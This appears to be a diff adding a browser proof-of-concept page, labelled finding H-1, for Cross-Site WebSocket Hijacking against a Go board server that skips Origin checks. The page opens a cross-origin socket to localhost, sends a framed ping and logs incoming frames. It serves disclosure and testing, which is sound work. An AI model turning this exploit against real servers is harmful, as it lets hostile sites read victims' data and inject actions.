@@ -1,0 +1,71 @@
+<!doctype html>
+<!--
+  H-1 — Cross-Site WebSocket Hijacking (CSWSH) browser PoC.
+
+  The server builds its websocket with golang.org/x/net/websocket and
+  Handshake: nil (pkg/hub/socketrouter.go), so it performs NO Origin validation.
+  Any website a victim visits can therefore open a socket to the board server in
+  the victim's browser context, read the live board stream, and inject moves /
+  settings — with no consent and no same-origin protection.
+
+  How to use (authorised local testing only):
+    1. Start a local board server, e.g. on http://localhost:8080
+    2. Serve THIS file from a DIFFERENT origin so the browser treats it as
+       cross-site, e.g.:  python3 -m http.server 9999
+       then open http://localhost:9999/h1_cswsh.html
+    3. Set TARGET below if your server is not on localhost:8080.
+
+  If the log shows "CONNECTED (cross-origin)" and frames arriving, the server
+  accepted a cross-site websocket -> CSWSH confirmed.
+-->
+<meta charset="utf-8">
+<title>CSWSH PoC — golab/board H-1</title>
+<style>
+  body { font: 14px/1.5 system-ui, sans-serif; margin: 2rem; max-width: 60rem; }
+  h1 { font-size: 1.2rem; }
+  #log { white-space: pre-wrap; background:#111; color:#0f0; padding:1rem;
+         border-radius:6px; height:22rem; overflow:auto; }
+  .warn { color:#b00; }
+</style>
+<h1>H-1 · Cross-Site WebSocket Hijacking PoC</h1>
+<p class="warn">Run only against a local, disposable instance you own.</p>
+<p>This page is loaded from a <b>different origin</b> than the board server. If it
+can still open the socket and receive board frames, Origin is not being checked.</p>
+<div id="log"></div>
+<script>
+  // --- config -------------------------------------------------------------
+  const TARGET = "localhost:8080";          // host:port of the board server
+  const ROOM   = "cswsh-victim-room";        // any room id
+  // ------------------------------------------------------------------------
+
+  const logEl = document.getElementById("log");
+  const log = (m) => { logEl.textContent += m + "\n"; logEl.scrollTop = logEl.scrollHeight; };
+
+  log("this page origin: " + location.origin);
+  log("opening ws://" + TARGET + "/socket/b/" + ROOM + " cross-origin ...");
+
+  // Browsers do NOT let JS set the Origin header — it is automatically this
+  // page's real origin. That is exactly the point: a real attacker page cannot
+  // forge Origin, so a server that validated it would reject this. This one does not.
+  const ws = new WebSocket("ws://" + TARGET + "/socket/b/" + ROOM);
+  ws.binaryType = "arraybuffer";
+
+  ws.onopen = () => {
+    log(">> CONNECTED (cross-origin). The server did not reject our Origin.");
+    log(">> A malicious site could now read this board and inject events for the victim.");
+    // Example: frame an application message (4-byte LE length + JSON) to prove
+    // we can also SEND. Here we send a harmless 'ping'.
+    const payload = new TextEncoder().encode(JSON.stringify({event:"ping", value:""}));
+    const buf = new Uint8Array(4 + payload.length);
+    new DataView(buf.buffer).setUint32(0, payload.length, true); // little-endian
+    buf.set(payload, 4);
+    ws.send(buf);
+    log(">> sent a framed 'ping' event.");
+  };
+  ws.onmessage = (e) => {
+    const n = (e.data.byteLength !== undefined) ? e.data.byteLength : String(e.data).length;
+    log("<< received board frame (" + n + " bytes) — cross-origin data exfiltration.");
+  };
+  ws.onerror = () => log("!! socket error (if the connection was refused, Origin may be enforced).");
+  ws.onclose = () => log("-- socket closed.");
+</script>
